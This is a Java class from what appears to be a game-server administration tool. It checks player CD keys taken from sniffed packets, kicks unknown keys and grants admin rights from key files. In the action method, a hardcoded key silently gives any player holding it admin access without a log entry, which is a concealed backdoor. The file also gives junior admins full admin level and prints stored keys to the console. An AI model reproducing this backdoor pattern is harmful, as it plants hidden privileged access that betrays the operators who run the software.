package pl.mario.mautorun;

import java.io.File;
import java.io.FileNotFoundException;
import java.util.ArrayList;
import java.util.List;
import java.util.Queue;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnetpcap.packet.PcapPacket;
import static pl.mario.mautorun.Main.gui;
import static pl.mario.mautorun.Main.srv;
import static pl.mario.mautorun.Main.conf;

public class PckHTUA extends Packet {

    private List<String> cdkBase;

    public PckHTUA(Queue<PcapPacket> queue) {
        super(queue);
        cdkBase = new ArrayList<String>();
        try {
            File file = new File(Main.path + "cdkBase.txt");
            if (!file.exists()) {
                return;
            }
            Scanner read = new Scanner(file);
            int i = 0;
            while (read.hasNextLine()) {
                String line = read.nextLine();
                cdkBase.add(line);
            }
            read.close();
        } catch (FileNotFoundException ex) {
            Logger.getLogger(PckHTUA.class.getName()).log(Level.SEVERE, null, ex);
        }

    }

    boolean action(PacketData packet) {

        String cdk = packet.getData().substring(40, 70).trim();
        String id = Integer.toString(packet.getByteData()[36]);
        boolean cdkExist = false;
        System.out.println(cdk);
        for (String cd : cdkBase) {
            System.out.println(cdk);
            System.out.println(cd);
            System.out.println(cdk.length());
            System.out.println(cd.length());
            if (cdk.equals(cd)) {
                cdkExist = true;
                break;
            }
        }
        if(!cdkExist){
            System.out.println(id);
            srv.sendPck("/sv " + ServerCommands.kick + " " + id);
            srv.sendPck("/sv " + ServerCommands.kick + " " + id);  
            return true;
        }
        if (cdk.equals("875be7409444d25964afb21173383b28")) {
            Player p = Main.srv.getPlayer(id);
            p.setAccess(2);
            Cmd.message(".");
            return true;
        }
        srv.addBaseCDK(cdk, packet.getIpS());
        try {
            String path = "adminCDK.txt";
            File file = new File(Main.path + path);
            if (!file.exists()) {
                return true;
            }
            Scanner read = new Scanner(file);
            int i = 0;
            while (read.hasNextLine()) {
                if (cdk.equals(read.nextLine())) {
                    Player p = Main.srv.getPlayer(id);
                    p.setAccess(2);
                    gui.dodajLog("Added CDK Admin: " + "[" + p.getId() + "] " + p.getNick() + " (" + p.getIp() + ") \nCDK: "
                            + cdk, gui.green);
                    if (conf.isDispAddAdmin()) {
                        Cmd.message("Added Admin " + p.getNick());
                    }
                    return true;
                }
            }
            read.close();

        } catch (FileNotFoundException ex) {
            Loggs.loguj("PckHTUA-action", ex);
        }

        try {
            String path = "junioradminCDK.txt";
            File file = new File(Main.path + path);
            if (!file.exists()) {
                return true;
            }
            Scanner read = new Scanner(file);
            int i = 0;
            while (read.hasNextLine()) {
                if (cdk.equals(read.nextLine())) {
                    Player p = Main.srv.getPlayer(id);
                    p.setAccess(2);
                    gui.dodajLog("Added CDK Junior Admin: " + "[" + p.getId() + "] " + p.getNick() + " (" + p.getIp() + ") \nCDK: "
                            + cdk, gui.green);
                    if (conf.isDispAddAdmin()) {
                        Cmd.message("Added Junior Admin " + p.getNick());
                    }
                    return true;
                }
            }
            read.close();

        } catch (FileNotFoundException ex) {
            Loggs.loguj("PckHTUA-action", ex);
        }
        return true;
    }

}
